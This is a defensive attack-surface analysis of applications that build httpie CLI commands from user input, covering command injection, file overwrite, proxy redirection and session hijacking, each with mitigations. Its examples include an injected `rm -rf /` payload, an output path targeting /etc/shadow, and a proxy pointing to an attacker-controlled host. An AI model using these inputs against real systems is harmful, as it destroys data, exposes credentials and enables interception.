# Attack Surface Analysis for httpie/cli

## Attack Surface: [Command Injection via Untrusted Input](./attack_surfaces/command_injection_via_untrusted_input.md)

*   **Description:** User-provided data is used to construct HTTPie command-line arguments without proper sanitization or validation.  This is the most direct and dangerous attack vector.
*   **CLI Contribution:** The HTTPie command-line interface is the *direct* target of the injection.  The attacker leverages the full functionality of HTTPie (all its options and arguments) to craft malicious commands.
*   **Example:**
    *   User input: `"; rm -rf /; echo "` (intended to be part of a URL)
    *   Resulting command (if unsanitized): `http GET example.com/"; rm -rf /; echo "`
    *   This attempts to execute `rm -rf /` on the system running the application, potentially deleting all files.
*   **Impact:**
    *   Arbitrary command execution on the host system (with the privileges of the application).
    *   Complete system compromise.
    *   Data exfiltration.
    *   Denial of service.
*   **Risk Severity:** Critical
*   **Mitigation Strategies:**
    *   **Strict Input Validation (Whitelist):** Implement a *strict* whitelist of allowed characters and patterns for *all* user-supplied data that forms *any* part of the HTTPie command.  Reject *any* input that doesn't conform to the whitelist.  *Never* rely on blacklisting. This is the most crucial mitigation.
    *   **Parameterization (Indirect Mitigation):** If possible, use a higher-level HTTP library that provides parameterized requests.  This avoids direct command-line string construction, but it's not a *direct* CLI mitigation.
    *   **Avoid Direct Command Construction (Indirect Mitigation):** Prefer using a wrapper library or API that abstracts away the direct construction of command-line arguments.  This provides a safer interface, but it's not a direct CLI mitigation.
    *   **Least Privilege:** Run the application with the *absolute minimum* necessary privileges.  This limits the damage even if command injection occurs. This is a crucial defense-in-depth measure.

## Attack Surface: [File Access/Overwrite via `--download` or `--output`](./attack_surfaces/file_accessoverwrite_via__--download__or__--output_.md)

*   **Description:** User input controls the file paths used with HTTPie's `--download` or `--output` options, allowing for arbitrary file reads or writes.
*   **CLI Contribution:** HTTPie's file writing capabilities (specifically the `--download` and `--output` command-line options) are abused.
*   **Example:**
    *   User input: `/etc/shadow` (intended to be an output filename)
    *   Resulting command: `http GET example.com --output /etc/shadow`
    *   This could attempt to overwrite the system's shadow password file (if running with sufficient privileges) or read its contents (if readable by the application's user).
*   **Impact:**
    *   System file corruption or destruction (potentially leading to system instability or unavailability).
    *   Information disclosure (sensitive system files, configuration files).
    *   Potential for complete system compromise (if critical system files are overwritten).
*   **Risk Severity:** High (can be Critical if the application runs with elevated privileges and can overwrite critical system files)
*   **Mitigation Strategies:**
    *   **Strict Path Validation:** Rigorously validate and sanitize user-provided file paths.  Enforce a *strict* whitelist of allowed directories and filenames.  *Absolutely prevent* the use of path traversal sequences (`../` or similar).  Use a well-defined, restricted set of allowed characters.
    *   **Dedicated Output Directory:** Configure the application to use a dedicated, isolated directory for *all* HTTPie output.  This directory should have *very* restricted permissions, allowing write access *only* to the application's user and no access to other users.
    *   **Least Privilege:** Run the application with the *minimum* file system access rights necessary.  The application should *not* have write access to any system directories or sensitive files.
    *   **Chroot Jail (Advanced):** For extremely high-security environments, consider running the application within a chroot jail to further restrict its file system access, effectively isolating it from the rest of the system.

## Attack Surface: [Proxy Manipulation via `--proxy`](./attack_surfaces/proxy_manipulation_via__--proxy_.md)

*   **Description:** User input controls the proxy server used by HTTPie via the `--proxy` option, allowing traffic redirection.
*   **CLI Contribution:** HTTPie's proxy functionality (the `--proxy` command-line option) is directly exploited.
*   **Example:**
    *   User input: `http://attacker-controlled.com:8080`
    *   Resulting command: `http GET example.com --proxy http://attacker-controlled.com:8080`
    *   All HTTP traffic is routed through the attacker's proxy server.
*   **Impact:**
    *   Man-in-the-middle attacks.
    *   Eavesdropping on sensitive data (including credentials, API keys, etc.).
    *   Data modification (the attacker can alter requests and responses).
    *   Potential for further attacks launched from the malicious proxy.
*   **Risk Severity:** High
*   **Mitigation Strategies:**
    *   **Hardcode Proxy Settings:** If a proxy is required, *hardcode* the proxy server address and port within the application's configuration.  *Never* allow user input to control the proxy settings. This is the most secure approach.
    *   **Proxy Whitelist (If User-Configurable is Unavoidable):** If user-configurable proxies are *absolutely* necessary (which should be avoided if at all possible), implement a *strict* whitelist of allowed proxy servers.  Reject any proxy not on the whitelist.
    *   **Input Validation (Less Effective):** If a whitelist is not feasible, rigorously validate the user-provided proxy URL, ensuring it conforms to expected patterns (e.g., valid hostname or IP address, valid port number) and doesn't contain malicious characters. However, this is significantly less secure than a whitelist.

## Attack Surface: [Session Hijacking/Manipulation via `--session`](./attack_surfaces/session_hijackingmanipulation_via__--session_.md)

*   **Description:** User input controls the session name or file used with HTTPie's `--session` option, allowing for session hijacking or the use of attacker-controlled session data.
*   **CLI Contribution:** HTTPie's session management features (the `--session` command-line option) are directly abused.
*   **Example:**
    *   User input: `existing_session` (a known, valid session name used by another user)
    *   Resulting command: `http GET example.com --session existing_session`
    *   The attacker reuses the authentication cookies/headers from the legitimate session, gaining unauthorized access.
*   **Impact:**
    *   Unauthorized access to resources protected by the session.
    *   Potential for data modification or exfiltration.
    *   Impersonation of legitimate users.
*   **Risk Severity:** High
*   **Mitigation Strategies:**
    *   **Controlled Session Management:** The application *must* tightly control session creation and naming.  *Never* allow user input to directly specify session names or files.  The application should be solely responsible for managing sessions.
    *   **Random Session Names:** Generate random, unpredictable, and sufficiently long session names to prevent guessing or brute-forcing.
    *   **Secure Session Storage:** Store session files in a secure, protected location with *very* restricted access. Only the application's user should have read/write access to this location.
    *   **Session Expiration:** Implement appropriate session expiration mechanisms, invalidating sessions after a period of inactivity or a fixed duration.
